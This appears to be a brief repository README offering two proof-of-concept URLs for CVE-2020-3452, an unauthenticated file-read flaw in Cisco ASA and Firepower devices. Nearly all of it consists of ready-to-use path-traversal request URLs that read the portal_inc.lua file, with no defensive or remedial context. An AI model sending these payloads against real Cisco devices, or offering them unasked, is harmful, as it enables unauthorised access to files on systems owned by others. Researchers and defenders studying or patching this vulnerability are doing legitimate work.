# open-twitter-hacking
```
Here is POC of CVE-2020-3452, unauthenticated file read in Cisco ASA & Cisco Firepower.

For example to read "/+CSCOE+/portal_inc.lua" file.

https://<domain>/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```
```
POC #2: 
https://<domain>/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
```
